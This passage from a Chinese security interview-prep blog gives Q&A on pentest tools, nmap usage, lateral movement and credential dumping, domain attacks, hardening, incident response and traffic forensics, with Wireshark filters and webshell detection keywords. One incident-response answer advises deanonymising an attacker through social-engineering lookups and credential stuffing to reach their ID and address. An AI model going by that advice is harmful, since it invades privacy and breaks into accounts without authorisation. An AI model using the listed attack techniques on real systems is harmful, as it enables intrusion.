href="http://192.168.11.131/test2/demo2.jpg/aaa">http://192.168.11.131/test2/demo2.jpg/aaa</a>.<br>phpURI）&#x2F;test.jpg&#x2F;test.php后，一看后缀是.php，便认<br>为该文件是php文件，转交给php去处理。php一<br>看&#x2F;test.jpg&#x2F;test.php不存在，便删去最后<br>的&#x2F;test.php，又看&#x2F;test.jpg存在，便把&#x2F;test.jpg当成<br>要执行的文件了，又因为后缀为.jpg，php认为这不<br>是php文件，于是返回“Access denied.”。<br>2、00截断</p><h1 id="二、工具常问"><a href="#二、工具常问" class="headerlink" title="二、工具常问"></a>二、工具常问</h1><h2 id="1-你常用的渗透工具or漏扫工具？"><a href="#1-你常用的渗透工具or漏扫工具？" class="headerlink" title="1.你常用的渗透工具or漏扫工具？"></a>1.你常用的渗透工具or漏扫工具？</h2><p>渗透工具：msf，cs，nmap，slqmap，dirscan，burp<br>等<br>漏扫：xray,awvs,nessus,appscan等</p><h2 id="2-sqlmap中–os-shell的原理及利用条件？"><a href="#2-sqlmap中–os-shell的原理及利用条件？" class="headerlink" title="2.sqlmap中–os-shell的原理及利用条件？"></a>2.sqlmap中–os-shell的原理及利用条件？</h2><p>利用条件：root权限，知道绝对路径，GPC关闭，<br>Secure_file_priv参数为空或者为指定路径。<br>原理及流程：原理其他比较简单，先目标的一个基础<br>信息的探测，然后上传shell到目标web网站上，利用<br>shell传参进行命令执行，退出时删除shell。<br>当然数据库不同，必要条件也不同，例如sqlserver需<br>要数据库支持外连，数据库权限为SA权限，主要利用<br>xp_cmdshell扩展进行命令执行。<br>原理细致分析：<br><a href="https://xz.aliyun.com/t/7942#toc-4">https://xz.aliyun.com/t/7942#toc-4</a></p><h2 id="3-对于信息收集你会使用哪些工具？具体用来干什么？"><a href="#3-对于信息收集你会使用哪些工具？具体用来干什么？" class="headerlink" title="3.对于信息收集你会使用哪些工具？具体用来干什么？"></a>3.对于信息收集你会使用哪些工具？具体用来干什么？</h2><p>nmap：端口服务扫描，常见漏洞探测<br>dirsearch：目录信息扫描<br>whatwaf：waf检测识别<br>WFuzz：fuzz测试<br>潮汐指纹识别orwappalzer：cms及中间件等信息收集<br>等等等…..</p><h2 id="4-市面上的几款webshell管理工具，他们的相同点和不同点？"><a href="#4-市面上的几款webshell管理工具，他们的相同点和不同点？" class="headerlink" title="4.市面上的几款webshell管理工具，他们的相同点和不同点？"></a>4.市面上的几款webshell管理工具，他们的相同点和不同点？</h2><p>相同点：都是webshell管理的工具，都采用的是C&#x2F;S模<br>型，上传的shell为S，个人客户端为C。<br>不同点：实现区别，功能差异，例如冰蝎有流量动态<br>加密。</p><h2 id="5-有没有了解或者使用过厂商的安全设备？-有的话请举例说明"><a href="#5-有没有了解或者使用过厂商的安全设备？-有的话请举例说明" class="headerlink" title="5.有没有了解或者使用过厂商的安全设备？(有的话请举例说明)"></a>5.有没有了解或者使用过厂商的安全设备？(有的话请举例说明)</h2><p>而目前比较知名的态势感知厂商主要有：服云、安<br>恒、瀚思、360、深信服、新华三，绿盟，奇安信等<br>等。<br>演示视频：新华三A02演示视频：<br><a href="https://v.youku.com/v">https://v.youku.com/v</a><br>_show&#x2F;id_XMzk4NTc4NDM4MA&#x3D;&#x3D;.html<br>其他的自己找找，或者根据个人情况回答。</p><h2 id="6-nmap常用参数，说一下？"><a href="#6-nmap常用参数，说一下？" class="headerlink" title="6. nmap常用参数，说一下？"></a>6. nmap常用参数，说一下？</h2><p><strong>-sT</strong> TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。<br><strong>-sS</strong> 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。<br><strong>-sF</strong>  -sN 秘密FIN数据包扫描、Xmas Tree、Null扫描模式<br><strong>-sP</strong> ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。<br><strong>-sU</strong> UDP扫描，但UDP扫描是不可靠的<br><strong>-sA</strong> 这项高级的扫描方法通常用来穿过防火墙的规则集<br><strong>-sV</strong> 探测端口服务版本<br><strong>-Pn</strong> 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描<br><strong>-v</strong> 显示扫描过程，推荐使用<br><strong>-h</strong> 帮助选项，是最清楚的帮助文档<br><strong>-p</strong> 指定端口，如“1-65535、1433、135、22、80”等<br><strong>-O</strong> 启用远程操作系统检测，存在误报<br><strong>-A</strong> 全面系统检测、启用脚本检测、扫描等<br><strong>-oN&#x2F;-oX&#x2F;-oG</strong> 将报告写入文件，分别是正常、XML、grepable 三种格式<br><strong>-T4</strong> 针对TCP端口禁止动态扫描延迟超过10ms<br><strong>-iL</strong> 读取主机列表，例如，“-iL C:\ip.txt”</p><p>扫描指定IP所开放的端口：nmap -sS -p 1-65535 -v XXX.XXX.XXX.XXX<br>扫描C段存活主机：nmap -sP XXX.XXX.XXX.XXX&#x2F;24<br>指定端口扫描：nmap -p 80,1433,22,1521 XXX.XXX.XXX.XXX<br>探测主机操作系统：nmap -o XXX.XXX.XXX.XXX<br>全面的系统探测：nmap -v -A XXX.XXX.XXX.XXX（Nmap默认扫描主机1000个高危端口）<br>探测指定网段：nmap XXX.XXX.XXX.XXX-XXX<br>穿透防火墙进行扫描：nmap -Pn -A XXX.XXX.XXX.XXX（XXX.XXX.XXX.XXX禁止用ping的）<br>使用脚本，扫描Web敏感目录：nmap -p 80 –script&#x3D;http-enum.nse XXX.XXX.XXX.XXX</p><h1 id="三、内网常问"><a href="#三、内网常问" class="headerlink" title="三、内网常问"></a>三、内网常问</h1><h2 id="1-横向渗透命令执行手段？"><a href="#1-横向渗透命令执行手段？" class="headerlink" title="1. 横向渗透命令执行手段？"></a>1. 横向渗透命令执行手段？</h2><p>psexec，wmic，smbexec，winrm，net use共<br>享+计划任务+type命令。</p><h2 id="2-psexec和wmic或者其他的区别？"><a href="#2-psexec和wmic或者其他的区别？" class="headerlink" title="2. psexec和wmic或者其他的区别？"></a>2. psexec和wmic或者其他的区别？</h2><p>psexec会记录大量日志，wmic不会记录下日<br>志。wmic更为隐蔽</p><h2 id="3-Dcom怎么操作？"><a href="#3-Dcom怎么操作？" class="headerlink" title="3. Dcom怎么操作？"></a>3. Dcom怎么操作？</h2><p>通过powershell执行一些命令，命令语句比较<br>复杂，不记得了 </p><h2 id="4-抓取密码的话会怎么抓？"><a href="#4-抓取密码的话会怎么抓？" class="headerlink" title="4. 抓取密码的话会怎么抓？"></a>4. 抓取密码的话会怎么抓？</h2><p>procdump+mimikatz 转储然后用mimikatz离线<br>读取</p><h2 id="5-什么版本之后抓不到密码？"><a href="#5-什么版本之后抓不到密码？" class="headerlink" title="5. 什么版本之后抓不到密码？"></a>5. 什么版本之后抓不到密码？</h2><p>windows server 2012之后</p><h2 id="6-抓不到的话怎么办？"><a href="#6-抓不到的话怎么办？" class="headerlink" title="6. 抓不到的话怎么办？"></a>6. 抓不到的话怎么办？</h2><p>翻阅文件查找运维等等是否记录密码。<br>或者hash传递。<br>或者获取浏览器的账号密码等等</p><h2 id="7-域内攻击方法有了解过吗？"><a href="#7-域内攻击方法有了解过吗？" class="headerlink" title="7. 域内攻击方法有了解过吗？"></a>7. 域内攻击方法有了解过吗？</h2><p>MS14-068、Roasting攻击离线爆破密码、委派<br>攻击，非约束性委派、基于资源的约束委派、<br>ntlm relay。</p><h2 id="8-桌面有管理员会话，想要做会话劫持怎么做？"><a href="#8-桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="8. 桌面有管理员会话，想要做会话劫持怎么做？"></a>8. 桌面有管理员会话，想要做会话劫持怎么做？</h2><p>提权到system权限，然后去通过工具，就能够<br>劫持任何处于已登录用户的会话，而无需获得<br>该用户的登录凭证。</p><h2 id="9-内网渗透思路？"><a href="#9-内网渗透思路？" class="headerlink" title="9. 内网渗透思路？"></a>9. 内网渗透思路？</h2><p>代理穿透<br>权限维持<br>内网信息收集<br>口令爆破<br>凭据窃取<br>社工<br>横行和纵向渗透<br>拿下域控</p><h2 id="10-当前机器上有一个密码本，但加密了，应该"><a href="#10-当前机器上有一个密码本，但加密了，应该" class="headerlink" title="10. 当前机器上有一个密码本，但加密了，应该"></a>10. 当前机器上有一个密码本，但加密了，应该</h2><p>怎么办？<br>使用hashcat或者其他密码爆破工具进行爆<br>破。</p><h2 id="11-获取域控的方法有哪些？"><a href="#11-获取域控的方法有哪些？" class="headerlink" title="11. 获取域控的方法有哪些？"></a>11. 获取域控的方法有哪些？</h2><p>SYSVOL<br>MS14-068 Kerberos<br>SPN扫描<br>黄金票据和白银票据<br>域服务账号破解<br>凭证窃取<br>NTLM relay<br>kerberos委派<br>zerologon漏洞<br>地址解析协议<br>CVE-2021-42278和CVE-2021-42287</p><h2 id="12-黄金票据和白银票据说一下？"><a href="#12-黄金票据和白银票据说一下？" class="headerlink" title="12. 黄金票据和白银票据说一下？"></a>12. 黄金票据和白银票据说一下？</h2><p><a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p><h2 id="13-Windows权限维持？Linux权限维持？"><a href="#13-Windows权限维持？Linux权限维持？" class="headerlink" title="13. Windows权限维持？Linux权限维持？"></a>13. Windows权限维持？Linux权限维持？</h2><p>windows: <a href="https://xz.aliyun.com/t/8095">https://xz.aliyun.com/t/8095</a><br>linux: <a href="https://xz.aliyun.com/t/7338">https://xz.aliyun.com/t/7338</a></p><h2 id="14-shellcode免杀了解吗？有哪些方法？"><a href="#14-shellcode免杀了解吗？有哪些方法？" class="headerlink" title="14. shellcode免杀了解吗？有哪些方法？"></a>14. shellcode免杀了解吗？有哪些方法？</h2><p><a href="https://xz.aliyun.com/t/7170">https://xz.aliyun.com/t/7170</a></p><h2 id="15-域信息收集思路？"><a href="#15-域信息收集思路？" class="headerlink" title="15. 域信息收集思路？"></a>15. 域信息收集思路？</h2><ol><li>判断是否存在域</li><li>定位域控</li><li>域基本信息查询（所有域、域信任信息、域密码策略）</li><li>域内用户查询（定位域管）</li><li>域内主机查询<br> 6.BloodHound工具</li></ol><h2 id="16-代理转发常用的工具有哪些？"><a href="#16-代理转发常用的工具有哪些？" class="headerlink" title="16. 代理转发常用的工具有哪些？"></a>16. 代理转发常用的工具有哪些？</h2><p>frp<br>Neo-reGeorg<br>ssf<br>ew<br>Venom</p><h1 id="四、计算机网络常问"><a href="#四、计算机网络常问" class="headerlink" title="四、计算机网络常问"></a>四、计算机网络常问</h1><h2 id="1-说一说OSI模型和TCP-x2F-IP体系结构？"><a href="#1-说一说OSI模型和TCP-x2F-IP体系结构？" class="headerlink" title="1. 说一说OSI模型和TCP&#x2F;IP体系结构？"></a>1. 说一说OSI模型和TCP&#x2F;IP体系结构？</h2><p>OSI模型：从下到上为物理层，数据链路层，网络层，<br>传输层，会话层，表达层，应用层。<br>TCP&#x2F;IP结构：从下到上为网络接口层，网络层，传输<br>层，应用层</p><h2 id="2-TCP-x2F-IP的三次握手和四次挥手过程，且为什么要这样？"><a href="#2-TCP-x2F-IP的三次握手和四次挥手过程，且为什么要这样？" class="headerlink" title="2. TCP&#x2F;IP的三次握手和四次挥手过程，且为什么要这样？"></a>2. TCP&#x2F;IP的三次握手和四次挥手过程，且为什么要这样？</h2><p>三次握手：当客户端连接服务器，首先会对服务器<br>发送一个SYN包(连接请求数据)，表示询问是否可以<br>连接，服务器如果同意连接，就会回复一个<br>SYN+ACK，客户端收到后就会回复一个ACK包，连<br>接建立。因为期间相互发送了三包数据，所以称为<br>三次握手。<br>四次挥手：处于连接状态的客户端或者服务器都可<br>以发起关闭连接请求，假设客户端主动发起关闭请<br>求，它先需要先服务端发送一个FIN包，表示我要关<br>闭连接，自己进入终止等待1的状态(第一次挥手)，<br>服务器收到FIN包之后发送一包ACK包，表示自己进<br>入关闭等待的状态，客户端进入终止等待2的状态<br>(第二次挥手)，服务器这时候还可以发送未发送的<br>数据，客户端还可以接收数据，等到服务端将所有<br>数据发送完后，向客户端发送一个FIN包，自身进入<br>最后缺人状态(第三次挥手)，客户端收到后回复一<br>个ACK包，自己进入超时等待状态，进入超时时间<br>后关闭连接，而服务端收到ACK包后立即关闭连接<br>(第四次挥手)。<br>原因：为了解决网络信道不可靠的问题，为了能够<br>在不可靠的信道上建立起可靠的连接。<br>一条视频看懂TCP&#x2F;IP协议的三次握手与四次挥手(看<br>一遍就会，强推)：<a href="https://b23.tv/5md739N">https://b23.tv/5md739N</a></p><h2 id="3-私有ip的地址划分？"><a href="#3-私有ip的地址划分？" class="headerlink" title="3. 私有ip的地址划分？"></a>3. 私有ip的地址划分？</h2><p>分为三类<br>A类：10.0.0.0——10.255.255.255<br>B类：172.16.0.0——172.31.255.255<br>C类：192.168.0.0——192.168.255.255</p><h2 id="4-UDP和TCP协议的区别及优缺点？"><a href="#4-UDP和TCP协议的区别及优缺点？" class="headerlink" title="4. UDP和TCP协议的区别及优缺点？"></a>4. UDP和TCP协议的区别及优缺点？</h2><p>UDP协议是基于非连接的，发送数据就是将数据简单<br>是封装，然后从网卡发出去即可。数据包之间并没有<br>状态上的联系，所以其优点就是性能消耗少，资源占<br>用少；缺点就是稳定性弱。<br>TCP协议是基于连接的，在收发数据前必须和对方建立<br>可靠的连接，建立连接的3次握手、断开连接的4次挥<br>手，为数据传输打下可靠基础。所以优点就是 传输稳<br>定可靠。</p><h2 id="5-正向Shell和反向Shell的区别是什么？"><a href="#5-正向Shell和反向Shell的区别是什么？" class="headerlink" title="5. 正向Shell和反向Shell的区别是什么？"></a>5. 正向Shell和反向Shell的区别是什么？</h2><p>正向shell：攻击者连接被攻击机器，可用于攻击者处<br>于内网，被攻击者处于公网的情况。<br>反向shell：被攻击者主动连接攻击者，可用于攻击者<br>处于外网，被攻击者处于内网的情况。</p><h2 id="6-正向代理和反向代理的区别？"><a href="#6-正向代理和反向代理的区别？" class="headerlink" title="6. 正向代理和反向代理的区别？"></a>6. 正向代理和反向代理的区别？</h2><p><strong>正向代理</strong>：当客户端无法访问外部资源的时候(例如<br>goolge，youtube)，可以通过一个正向代理去间接的访<br>问。<br>打个比方：A向C借钱，由于一些情况不能直接向C借<br>钱，于是A想了一个办法，他让B去向C借钱，这样B就<br>代替A向C借钱，A就得到了C的钱，C并不知道A的存<br>在，B就充当了A的代理人的角色。<br><strong>反向代理</strong>：客户端时无感知代理的存在，以代理服务<br>器来接收internet上的连接，然后将请求转发给内部网<br>络上的服务器，并从服务器上得到的结果返回给<br>internet上请求连接的客户端。<br>再次打个比方：A向B借钱，B没有拿自己的钱，而是悄<br>悄地向C借钱，拿到钱之后再交给A,A以为是B的钱，他<br>并不知道C的存在。<br><strong>在内网渗透中，正反向代理可以这样回答</strong><br>正向代理：已控服务器监听端口，通过这个端口形成<br>一个正向的隧道，由代理机器代替主机去访问内网目<br>标。但是内网入口一般处于DMZ区域有防火墙拦截，<br>无法直接进入内网环境。<br>反向代理：由内网主机主动交出权限到代理机器，然<br>后本地去连接形成反向代理。例如：VPS监听本地端<br>口，已控内网服务器来连接此端口，形成一个隧道。<br>如果内网设备连接外网，就无法回弹只能再想其他办<br>法。</p><h2 id="7-常见防火墙的种类？"><a href="#7-常见防火墙的种类？" class="headerlink" title="7.常见防火墙的种类？"></a>7.常见防火墙的种类？</h2><p>简单种类：包过滤防火墙，代理防火墙，状态检测防<br>火墙 </p><h1 id="五、系统-windows及linux-方面常问"><a href="#五、系统-windows及linux-方面常问" class="headerlink" title="五、系统(windows及linux)方面常问"></a>五、系统(windows及linux)方面常问</h1><h2 id="1-如何手工判断对方操作系统？"><a href="#1-如何手工判断对方操作系统？" class="headerlink" title="1.如何手工判断对方操作系统？"></a>1.如何手工判断对方操作系统？</h2><p>1.修改url中参数，改成大写，正常为windows，不正常<br>即为linux<br>2.ping服务器，返还得TTL值不一样，windows一般在<br>100以上，linux一般是100以下。<br>3.查看数据包HTTP报头，如果是iis那就肯定是windows</p><h2 id="2-windows和Linux查看开放端口和运行服务的命令？"><a href="#2-windows和Linux查看开放端口和运行服务的命令？" class="headerlink" title="2.windows和Linux查看开放端口和运行服务的命令？"></a>2.windows和Linux查看开放端口和运行服务的命令？</h2><p>windows：查看端口使用情况【netstat -ano】，查看运<br>行的服务【net start】<br>Linux：查看本机开放端口【netstat -tuln】，查看当前<br>所有运行的服务【service –status-all | grep running】</p><h2 id="3-Linux日志目录？"><a href="#3-Linux日志目录？" class="headerlink" title="3.Linux日志目录？"></a>3.Linux日志目录？</h2><p>&#x2F;var&#x2F;log下</p><h2 id="4-windows中下载文件的命令有哪些？"><a href="#4-windows中下载文件的命令有哪些？" class="headerlink" title="4.windows中下载文件的命令有哪些？"></a>4.windows中下载文件的命令有哪些？</h2><p>certutil，bitsadmin，powershell，copy<br>winodws下载执行命令大全：<br><a href="https://xz.aliyun.com/t/1654">https://xz.aliyun.com/t/1654</a></p><h2 id="5-windows或linux被植入后门文件，讲一下你的排查流程？"><a href="#5-windows或linux被植入后门文件，讲一下你的排查流程？" class="headerlink" title="5.windows或linux被植入后门文件，讲一下你的排查流程？"></a>5.windows或linux被植入后门文件，讲一下你的排查流程？</h2><p>检查系统日志，检查系统用户，查看是否有异常的系<br>统用户，检查异常进程，检查隐藏进程，检查异常系<br>统文件，检查系统文件完整性，检查网络，检查系统<br>计划任务，检查系统后门，检查系统服务。</p><h2 id="6-windows提权的方法及思路？"><a href="#6-windows提权的方法及思路？" class="headerlink" title="6.windows提权的方法及思路？"></a>6.windows提权的方法及思路？</h2><ol><li>系统内核溢出提权；</li><li>数据库提权；</li><li>错误的系统配置提权；</li><li>DLL劫持提权；</li><li>特权第三方软件or服务提权；</li><li>令牌窃取提权；</li><li>web中间件漏洞提权；</li><li>AT，SC，PS提权等等；</li></ol><h2 id="7-Linux提权的思路及方法有哪些？"><a href="#7-Linux提权的思路及方法有哪些？" class="headerlink" title="7.Linux提权的思路及方法有哪些？"></a>7.Linux提权的思路及方法有哪些？</h2><p>1.系统内核溢出提权；<br>2.SUID和GUID提权；<br>3.不安全的环境变量提权；<br>4.定时任务提权；<br>5.数据库提权等</p><h2 id="8-windows加固方法？"><a href="#8-windows加固方法？" class="headerlink" title="8.windows加固方法？"></a>8.windows加固方法？</h2><p>1.修改3389端口<br>2.设置安全策略，不允许SAM账户的匿名枚举，不允许<br>SAM账户和共享的匿名枚举<br>3.在组策略中设置阻止访问注册表编辑工具<br>4.开启审核对象访问，开启审核目录服务访问，开启审<br>核系统事件<br>5.禁止445端口漏洞<br>6.设置屏幕保护在恢复时使用密码保护<br>7.设置Windows密码策略：设密码必须满足复杂性，设<br>置密码长度最小值为8位，最长存留期为30天<br>8.开启Windows防火墙，关闭ping服务，打开3389、80<br>等服务<br>9.关闭系统默认共享<br>等……..</p><h2 id="9-Linux加固方法？"><a href="#9-Linux加固方法？" class="headerlink" title="9.Linux加固方法？"></a>9.Linux加固方法？</h2><p>1.修改ssh的配置文件，禁止root直接登录<br>2.修改密码策略配置文件，确保密码最小长度为8位<br>3.确保错误登录3次，锁定此账户5分钟<br>4.禁止su非法提权，只允许root和wheel组用户su到root<br>5.不响应ICMP请求<br>6.设置登陆超时时间为10分钟<br>7结束非法登录用户<br>等……….</p><h2 id="10-木马驻留的方式有哪些-去哪些敏感位置排查木马-？"><a href="#10-木马驻留的方式有哪些-去哪些敏感位置排查木马-？" class="headerlink" title="10.木马驻留的方式有哪些(去哪些敏感位置排查木马)？"></a>10.木马驻留的方式有哪些(去哪些敏感位置排查木马)？</h2><p>1.注册表<br>2.服务<br>3.自启动目录<br>4.集合任务<br>5.关联文件类型</p><h1 id="六、应急响应常问"><a href="#六、应急响应常问" class="headerlink" title="六、应急响应常问"></a>六、应急响应常问</h1><h2 id="1-你知道哪些常用的威胁情报平台？"><a href="#1-你知道哪些常用的威胁情报平台？" class="headerlink" title="1.你知道哪些常用的威胁情报平台？"></a>1.你知道哪些常用的威胁情报平台？</h2><p>1.微步情报社区：<br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>2.奇安信情报中心：<br><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a><br>3.绿盟情报中心：<br><a href="https://nti.nsfocus.com/apt/home">https://nti.nsfocus.com/apt/home</a><br>此外360绿盟情报中心，VT，安恒等等</p><h2 id="2-设备误报如何处理（日志）？"><a href="#2-设备误报如何处理（日志）？" class="headerlink" title="2.设备误报如何处理（日志）？"></a>2.设备误报如何处理（日志）？</h2><p>1.关键字检测<br>2.异常请求<br>3.行为分析</p><h2 id="3-如何查看区分是扫描流量和手动流量？"><a href="#3-如何查看区分是扫描流量和手动流量？" class="headerlink" title="3.如何查看区分是扫描流量和手动流量？"></a>3.如何查看区分是扫描流量和手动流量？</h2><p>扫描流量：流量集中，具有数据包内容具有一定规律<br>型，数据包请求间隔低或频率基本一致。<br>手工流量：反之扫描流量回答即可。</p><h2 id="4-内网告警应该如何处理，流程是怎么样的？"><a href="#4-内网告警应该如何处理，流程是怎么样的？" class="headerlink" title="4.内网告警应该如何处理，流程是怎么样的？"></a>4.内网告警应该如何处理，流程是怎么样的？</h2><p>具体定位到哪台机器，报警说明知道具体漏洞类型，<br>打相应补丁。<br>利用webshell或者是shell查杀工具查杀，查看tmp目录<br>下是非有带有免杀的木马。彻底清除。再到全流量分<br>析的机子上看，是非有经过其他的机器。拿到攻击ip<br>之后到线上的一些网站查看主机类型，比如360或者微<br>步上，查看是否是傀儡机，vps跳板，或者是国内个人<br>云主机。如果是个人云主机，就可以通过whois查看是<br>非有最近绑定的域名，或者绑定者的邮箱。知道邮箱<br>之后就可以反查询出qq号说多少，再利用社工查询到<br>手机号，到一个知名的网站或知名软件上查询这个手<br>机号有没有注册过什么网站，可以去这些网站通过撞<br>库的方法登入，这样就可以拿到这个攻击者的身份<br>证，学校，地址这些了。</p><h2 id="5-应急响应的简单流程？"><a href="#5-应急响应的简单流程？" class="headerlink" title="5.应急响应的简单流程？"></a>5.应急响应的简单流程？</h2><p>收集信息：由安全设备收集主机，样本信息，以及一<br>些客户信息。<br>判断类型：是否是安全事件？具体为什么安全事件？<br>挖矿？DOS？等。<br>深入分析：从系统角度深入分析，日志，进程，启动<br>项这些去分析。<br>清理处置：杀掉异常进程，删除异常文件，打补丁或<br>者修复相关文件等。<br>产出报告：对此次安全事件进行一个完整的文档描<br>述。</p><h2 id="6-对蜜罐有什么了解？"><a href="#6-对蜜罐有什么了解？" class="headerlink" title="6. 对蜜罐有什么了解？"></a>6. 对蜜罐有什么了解？</h2><p>蜜罐是对攻击者的欺骗技术，用以监视、检测、分析<br>和溯源攻击行为，没有业务用途。<br>蜜罐的流量预示着扫描或攻击行为，较好聚焦攻击流<br>量。</p><h2 id="7-防火墙怎样判断这是一个反序列化漏洞？"><a href="#7-防火墙怎样判断这是一个反序列化漏洞？" class="headerlink" title="7. 防火墙怎样判断这是一个反序列化漏洞？"></a>7. 防火墙怎样判断这是一个反序列化漏洞？</h2><p>抓包，反序列化的数据包有固定格式的字符串：<br>O:length:”value”:属性数：{属性类型:属性length:属性<br>value;属性类型:属性length:属性value;}。</p><h2 id="8-应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？"><a href="#8-应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？" class="headerlink" title="8.应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？"></a>8.应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？</h2><p>(1) 任务管理器netstat -anp寻找异常进程PID看端口信<br>息，然后根据端口信息定位到文件，cd &#x2F;proc&#x2F;PID （ls -<br>l查看），禁用可疑的服务项。<br>(2) windows还可以用wmic分析进程参数。</p><h2 id="9-如何查看被入侵后敲过的命令"><a href="#9-如何查看被入侵后敲过的命令" class="headerlink" title="9. 如何查看被入侵后敲过的命令?"></a>9. 如何查看被入侵后敲过的命令?</h2><p>History</p><h2 id="10-sftp-telnet-ssh的端口号？ssh与telnet的区别？"><a href="#10-sftp-telnet-ssh的端口号？ssh与telnet的区别？" class="headerlink" title="10. sftp,telnet,ssh的端口号？ssh与telnet的区别？"></a>10. sftp,telnet,ssh的端口号？ssh与telnet的区别？</h2><p>sftp：22<br>telnet：23<br>ssh：22<br>简单来说，ssh和telnet的区别就是一个是密文传输，一个是明文传输。</p><h1 id="七、溯源与流量常问"><a href="#七、溯源与流量常问" class="headerlink" title="七、溯源与流量常问"></a>七、溯源与流量常问</h1><h2 id="1-如何定位到攻击IP"><a href="#1-如何定位到攻击IP" class="headerlink" title="1.如何定位到攻击IP?"></a>1.如何定位到攻击IP?</h2><p>1)首先通过选择-统计-对话查看流量的走向情况，定位<br>可疑的IP地址。<br>2)根据定位到的IP地址，尝试对上传的webshell进行定<br>位ip.addr &#x3D;&#x3D;ip &amp;&amp;http matches<br>“uploadleval|select|xp_cmdshell”&amp;&amp;<br>http.request.method &#x3D;&#x3D; “POST”。<br>3)查找到 Webshell后尝试溯源漏洞位置，<br>http.request.uri contains“webshell.php”，定位到最开<br>始webshell执行或上传的时候。<br>4)根据最开始的HTTP上传包或者其他漏洞特产定位漏<br>洞类型。</p><h2 id="2-假设发现web应用服务器发现文件异常增多，初步怀疑被上"><a href="#2-假设发现web应用服务器发现文件异常增多，初步怀疑被上" class="headerlink" title="2. 假设发现web应用服务器发现文件异常增多，初步怀疑被上"></a>2. 假设发现web应用服务器发现文件异常增多，初步怀疑被上</h2><p>传webshell，描述流量分析溯源的思路?<br>1）查看eval、z0、shell、whoami等关键字，查看出现<br>次数过多的时候，可能需要查看是哪个页面发起的请<br>求，有可能是webshell。<br>2）通过 WireShark 工具快速搜索关键字，定位到异常<br>流量包。<br>3）找出异常IP和所上传的内容，查看是否为<br>webshell。</p><h2 id="3-wireshark简单的过滤规则"><a href="#3-wireshark简单的过滤规则" class="headerlink" title="3. wireshark简单的过滤规则?"></a>3. wireshark简单的过滤规则?</h2><p>【过滤ip】：过滤源ip地址:ip.src1.1.1.1;目的ip地址：<br>ip.dst1.1.1.1;<br>【过滤端口】：过滤80端口：tcp.port80，源端口：<br>tcp.srcport80，目的端口：tcp.dstport&#x3D;&#x3D;80<br>【协议过滤】：直接输入协议名即可，如http协议http<br>【http模式过滤】：过滤get&#x2F;post包<br>http.request.mothod&#x3D;&#x3D;”GET&#x2F;POST”</p><h2 id="4-Webshell流量交互的流量特征"><a href="#4-Webshell流量交互的流量特征" class="headerlink" title="4. Webshell流量交互的流量特征?"></a>4. Webshell流量交互的流量特征?</h2><p>1）Webshell是用来控制服务器的，在控制服务器的过<br>程中，就会触发许多系统，函数，例如eval、z0（菜刀<br>特征）、shell.需监控这些关键的函数，具体需要查看<br>是哪个网页发起的请求进行鉴别。<br>2）Webshell连接可能使用base64编码，正常功能也会<br>使用base64容易引起误报，一般与eval数量对比，数量<br>差异较小时可能被上传webshell进行编码通讯。<br>3）除了系统函数、base64编码通讯外，还存在<br>int_set(“display_errors”,0”）.为Webshell流量特征之<br>一。<br>4)还可以监控ifconfig whoami ipconfig等关键命令，这<br>是获得Webshell后基本，上都会执行的命令。</p><h2 id="5-SQL查询异常流量分析的思路？"><a href="#5-SQL查询异常流量分析的思路？" class="headerlink" title="5. SQL查询异常流量分析的思路？"></a>5. SQL查询异常流量分析的思路？</h2><ol><li>数据库短时间内查询增多有可能遭遇到了【扫描】<br>或者【sql注入测试】，可以结合流量分析工具进行研<br>判。</li><li>【select】 和【union】为数据库查询语句特征，当<br>这两者数量出现次数较多而且差异较小可能存在SOL注<br>入漏洞或正在被扫描器扫描，可监控这两个关键字，<br>但还需<br>要进一步查看具体请求参数。如：1)使用wireshark打<br>开抓取后的流量包，2)对于抓取到的数据包筛选出<br>HTTP协议包，在统计处筛选出短时间内流量较大的<br>IP。</li><li>尝试定位一些基本的注入特征（select、union、<br>（）、&#x2F;*、sleep等）。</li></ol><h2 id="6-批量检查http服务？"><a href="#6-批量检查http服务？" class="headerlink" title="6. 批量检查http服务？"></a>6. 批量检查http服务？</h2><p>方法一：直接使用nmapsV.py工具即可，用法为<br>python3 nmapsV.py ip.txtresult.txt。<br>方法二：使用nmap工具扫描，带上-sV参数进行版本识<br>别即可，将待检测的IP地址&#x2F;地址段添加进ip.txt文件<br>中。使用命令nmap -sV -il ip.txt-oA OUTPUT –nostylesheet,扫出来的结果导出 nmap文件，使用<br>nampReport 工具得出结果。</p><h1 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h1><h2 id="shiro漏洞原理"><a href="#shiro漏洞原理" class="headerlink" title="shiro漏洞原理"></a>shiro漏洞原理</h2><p>shiro漏洞原理是攻击者利用shiro的默认密钥伪造cookie，触发JAVA反序列化执行命令或者写shell。</p><h2 id="shiro工具原理"><a href="#shiro工具原理" class="headerlink" title="shiro工具原理"></a>shiro工具原理</h2><p>跑默认key</p><h2 id="shiro550和721的区别"><a href="#shiro550和721的区别" class="headerlink" title="shiro550和721的区别"></a>shiro550和721的区别</h2><p>721是需要有效的登录才可以    550不用登录就可以直接跑key</p><h2 id="log4j原理"><a href="#log4j原理" class="headerlink" title="log4j原理"></a>log4j原理</h2><p>log4j是一款通用日志记录工具，log4j有个lookup接口通过JNDI注入触发日志，在{}里面调用jndi服务反弹shell到指定的服务器<br>除了jndi还可以调用rmi</p><h2 id="fastjson原理"><a href="#fastjson原理" class="headerlink" title="fastjson原理"></a>fastjson原理</h2><p>fastjson就是为了知道传入的值是什么类型。加了autotype机制导致的。因为他为了知道是什么详细类型，每次都需要读取下@type导致的<br>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，<br>执行构造函数形成RCE。</p><h2 id="weblogic漏洞原理"><a href="#weblogic漏洞原理" class="headerlink" 